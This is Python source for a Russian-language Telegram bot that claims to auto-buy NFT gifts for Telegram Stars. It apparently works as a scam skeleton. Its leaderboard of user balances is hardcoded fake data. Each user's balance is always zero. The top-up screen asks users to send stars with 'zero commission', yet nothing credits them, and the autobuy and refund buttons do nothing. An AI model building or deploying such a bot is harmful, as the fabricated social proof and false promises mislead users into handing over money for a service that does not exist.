import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
import os

load_dotenv()
API_TOKEN = os.getenv('TELEGRAM_API_KEY')

bot = telebot.TeleBot(API_TOKEN)

def create_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(InlineKeyboardButton("🤖 Автопокупка", callback_data="autobuy"))
    keyboard.add(
        InlineKeyboardButton("💳 Пополнить счёт", callback_data="topup"),
        InlineKeyboardButton("🔄 Возврат звёзд", callback_data="refund")
    )
    keyboard.add(
        InlineKeyboardButton("🎁 Магазин подарков", callback_data="giftshop"),
        InlineKeyboardButton("🏆 Топ по балансу", callback_data="top_balance")
    )
    keyboard.add(
        InlineKeyboardButton("🧾 Чеки", callback_data="checks"),
        InlineKeyboardButton("📜 История покупок", callback_data="purchase_history")
    )
    keyboard.add(
        InlineKeyboardButton("🌍 Изменить язык", callback_data="change_language"),
        InlineKeyboardButton("❤️ Поддержать проект", callback_data="support_project")
    )
    keyboard.add(
        InlineKeyboardButton("❓ Помощь", url="https://t.me/BladeAdmin"),
        InlineKeyboardButton("🎀 Всё о GIFтах",url="https://t.me/AutoGiftNews")
    )
    return keyboard

def create_topup_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("⬅ Вернуться назад", callback_data="back_to_main"))
    return keyboard

def create_check_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🧾 Создать чек", callback_data="create_check"))
    keyboard.add(InlineKeyboardButton("⬅ Вернуться назад", callback_data="back_to_main"))
    return keyboard

def create_insufficient_balance_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("⬅ Вернуться назад", callback_data="back_to_main"))
    return keyboard

def get_top_balance_text():
    return (
        "🏆⭐ *Топ по балансу звёзд.* Имена скрыты в соображениях безопасности.\n\n"
        "```"
        " 🥇 Имя скрыто 343801⭐\n"
        " 🥈 Имя скрыто 80000⭐\n"
        " 🥉 Имя скрыто 40000⭐\n"
        " #4 👦 Имя скрыто 30000⭐\n"
        " #5 🧑‍🚀 Имя скрыто 2100⭐\n"
        " #6 👩‍🎤 Имя скрыто 2000⭐\n"
        " #7 👨‍🔬 Имя скрыто 2000⭐\n"
        " #8 👩‍🏫 Имя скрыто 2000⭐\n"
        " #9 🧑‍💻 Имя скрыто 1980⭐\n"
        " #10 🧑‍🚒 Имя скрыто 1900⭐\n"
        " #11 👨‍⚕️ Имя скрыто 1500⭐\n"
        " #12 👩‍🌾 Имя скрыто 1300⭐\n"
        " #13 👨‍🔧 Имя скрыто 1169⭐\n"
        " #14 🧑‍🍳 Имя скрыто 1138⭐\n"
        " #15 👩‍🎓 Имя скрыто 1100⭐\n"
        " #16 👩‍🚀 Имя скрыто 1100⭐\n"
        " #17 👨‍✈️ Имя скрыто 1099⭐\n"
        " #18 👩‍⚖️ Имя скрыто 1095⭐\n"
        " #19 🧑‍🎨 Имя скрыто 1048⭐\n"
        " #20 👨‍🚒 Имя скрыто 1045⭐\n"
        "```\n"
        "#12627 👶 *Ugh* 0⭐ _(Вы)_"
    )

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(
        message.chat.id,
        "🎁 *Приветствую!* Я бот для автоматической покупки новых NFT подарков в телеграме\n\n"
        "Подарки от бота *можно улучшить*, но нельзя *разобрать на звёзды*.\n\n"
        "Ниже ты можешь изменить настройки под свои запросы. Дальше бот сделает всё *сам*.\n\n"
        f"```\nВаш баланс: 0 ⭐```",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "top_balance":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=get_top_balance_text(),
            parse_mode="Markdown",
            reply_markup=create_topup_keyboard()
        )
    elif call.data == "topup":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🌟 *Отправьте боту желаемое количество звёзд для пополнения.\n\n"
                 "<b>Комиссия бота 0%.* </b>",
            reply_markup=create_topup_keyboard(),
            parse_mode = "HTML"
        )
    elif call.data == "checks":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="<b>🧾 Передача ваших звёзд чеками! Просто напишите </b>\n\n"
                 f"```\nAutoGiftRobot 100```\n\n"
                 "<b>в диалог с кем-либо, и отправьте ему звёзды.</b>",
            reply_markup=create_check_keyboard(),
            parse_mode="HTML"
        )
    elif call.data == "create_check":
        balance = 0
        if balance < 25:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="У вас недостаточный баланс звёзд для создания чека.\n"
                     "Пожалуйста, пополните счёт минимум на 25 ⭐, чтобы реализовать это действие.",
                reply_markup=create_insufficient_balance_keyboard()
            )
        else:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="Чек успешно создан! 🎉",
                reply_markup=create_check_keyboard()
            )
    elif call.data == "back_to_main":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🎁 *Приветствую!* Я бот для автоматической покупки новых NFT подарков в телеграме\n\n"
                 "Подарки от бота *можно улучшить*, но нельзя *разобрать на звёзды*.\n\n"
                 "Ниже ты можешь изменить настройки под свои запросы. Дальше бот сделает всё *сам*.\n\n"
                 f"```\nВаш баланс: 0 ⭐```",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard()
        )

bot.polling()

